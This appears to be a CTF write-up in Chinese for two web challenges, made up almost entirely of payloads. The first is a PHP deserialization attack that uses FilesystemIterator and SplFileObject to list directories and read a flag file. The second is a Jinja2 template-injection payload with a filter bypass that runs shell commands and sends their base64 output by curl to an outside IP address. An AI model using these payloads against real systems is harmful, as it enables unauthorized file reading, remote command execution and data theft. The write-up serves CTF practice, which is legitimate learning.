# easyphp

遍历目录

```php
<?php
class XMAN{
    public $class="FilesystemIterator";
    public $para="/var/www/html";
    public $check;
}

$a=new XMAN();
echo urlencode(serialize($a));
```

xctf=O%3A4%3A"XMAN"%3A3%3A{s%3A5%3A"class"%3Bs%3A18%3A"FilesystemIterator"%3Bs%3A4%3A"para"%3Bs%3A13%3A"%2Fvar%2Fwww%2Fhtml"%3Bs%3A5%3A"check"%3BN%3B}

```php
<?php
class XMAN{
    public $class="FilesystemIterator";
    public $para="/var/www/html/xxxXXXmMManNNn";
    public $check;
}

$a=new XMAN();
echo urlencode(serialize($a));
```

xctf=O%3A4%3A"XMAN"%3A3%3A{s%3A5%3A"class"%3Bs%3A18%3A"FilesystemIterator"%3Bs%3A4%3A"para"%3Bs%3A28%3A"%2Fvar%2Fwww%2Fhtml%2FxxxXXXmMManNNn"%3Bs%3A5%3A"check"%3BN%3B}

```php
<?php
class XMAN{
    public $class="SplFileObject";
    public $para="/var/www/html/xxxXXXmMManNNn/f1a4.php";
    public $check;
}

$a=new XMAN();
echo urlencode(serialize($a));
```

xctf=O%3A4%3A"XMAN"%3A3%3A{s%3A5%3A"class"%3Bs%3A13%3A"SplFileObject"%3Bs%3A4%3A"para"%3Bs%3A37%3A"%2Fvar%2Fwww%2Fhtml%2FxxxXXXmMManNNn%2Ff1a4.php"%3Bs%3A5%3A"check"%3BN%3B}

# 你的名字

```python
{% iconfigf ''.__claconfigss__.__mrconfigo__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecconfigache.oconfigs.popconfigen('curl http://39.96.83.106:8080/ -d `ls /|base64`') %}1{% endiconfigf %}
```

![image-20210806105335131](wp/image-20210806105335131.png)

![image-20210806105253118](wp/image-20210806105253118.png)

```python
{% iconfigf ''.__claconfigss__.__mrconfigo__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecconfigache.oconfigs.popconfigen('curl http://39.96.83.106:4567/ -d `cat /flag_1s_Hera|base64`') %}1{% endiconfigf %}
```

